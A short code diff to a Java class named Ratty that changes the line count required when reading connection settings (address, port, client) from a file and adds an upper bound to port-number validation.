@@ -40,7 +40,7 @@ public final class Ratty {
 	private static void readConnectionData() {
 		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
 		
-		if (lines.length >= 4) {
+		if (lines.length >= 3) {
 			final String addressString = lines[0].trim();
 			final String portString = lines[1].trim();
 			final String clientString = lines[2].trim();
@@ -71,7 +71,7 @@ public final class Ratty {
 		try {
 			final int port = Integer.parseInt(input);
 			
-			if (port < 0) {
+			if (port < 0 || port > 65535) {
 				return -1;
 			}
 			
